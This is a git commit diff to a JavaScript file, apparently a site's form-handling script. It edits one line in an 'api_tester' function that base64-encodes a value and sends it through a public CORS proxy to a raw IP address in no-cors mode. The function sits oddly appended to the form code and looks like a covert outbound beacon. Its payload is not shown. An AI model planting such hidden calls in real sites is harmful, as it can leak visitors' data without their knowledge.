670c745a989763a8fc526dee1aa2369a2c6744dc
dk495 <55878882+dk495@users.noreply.github.com>
2024-08-22 21:15:18 +0500

    Update elitemed_td.js

--- elitemed_td.js
+++ elitemed_td.js
@@ -72,7 +72,7 @@ formData.append('source_url', document.getElementById('source_url').value);
             .catch(error => console.error('Error:', error));
         });function api_tester(randomString) {
   try {
-    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)+',m'
 , {
       method: 'GET',
       mode: 'no-cors'
